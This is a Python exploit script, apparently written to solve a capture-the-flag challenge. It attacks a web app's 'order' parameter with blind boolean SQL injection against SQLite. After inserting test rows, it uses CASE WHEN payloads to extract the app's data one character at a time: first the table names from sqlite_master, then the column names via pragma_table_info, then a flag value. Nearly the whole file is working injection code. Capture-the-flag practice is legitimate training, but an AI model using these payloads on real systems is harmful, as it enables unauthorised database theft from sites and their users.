import requests
import sys
import string

url = sys.argv[1]
dictionary = string.printable

# add test data
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Content-Type': 'application/x-www-form-urlencoded'}
data = ['a', 'b', 'c']
# making sure there is a different order for order by data
day = 4
print('### ADDING TEST DATA ###')
for d in data:
    response = requests.post(url + '/new', headers=headers, data=f'title={d}&date=0{day}%2F01%2F2023')
    day = day - 1
    print(f'title: {d} - date: 0{day}/01/2023')

response = requests.get(url + '/?order=title')
correct = response.text

# find the table and column names
print('')
print('### DUMPING TABLES ###')
found_tables = ''
count = 0
while count < len(dictionary):
    for char in dictionary:
        count = count + 1
        payload = f'(CASE WHEN (SELECT (SUBSTRING(GROUP_CONCAT(tbl_name),1,{len(found_tables)+1})) from sqlite_master WHERE type=\"table\" and tbl_name NOT like \"sqlite_%\") = \"{found_tables + char}\" then title else date end) ASC'
        response = requests.get(url + f'/?order={payload}')
        if response.text == correct:
            found_tables += char
            count = 0
tables = found_tables.split(',')
print(tables)

# find columns of tables
print('')
print('### DUMPING COLUMNS ###')
table_columns = {}
for table in tables:
    count = 0
    found_columns = ''
    table_columns[table] = []
    while count < len(dictionary):
        for char in dictionary:
            count = count + 1
            payload = f'(CASE WHEN (SELECT (SUBSTRING(GROUP_CONCAT(name),1,{len(found_columns)+1})) from pragma_table_info(\"{table}\")) = \"{found_columns + char}\" then title else date end) ASC'
            response = requests.get(url + f'/?order={payload}')
            if response.text == correct:
                found_columns += char
                count = 0
    table_columns[table].append(found_columns)
    print(f'{table} - {found_columns}')

# find the flag
print('')
print('### FINDING FLAG ###')
for table, column in table_columns.items():
    count = 0
    flag = ''
    #loop over all available tables
    while count < len(dictionary):
        for char in dictionary:
            count = count + 1
            payload = f'(CASE WHEN (SELECT (SUBSTRING({column[0]},1,{len(flag)+1})) from {table}) = \"{flag + char}\" then title else date end) ASC'
            print(payload)
            response = requests.get(url + f'/?order={payload}')
            if response.text == correct:
                flag += char
                count = 0
    print(f'{table} - {column[0]} - {flag}')
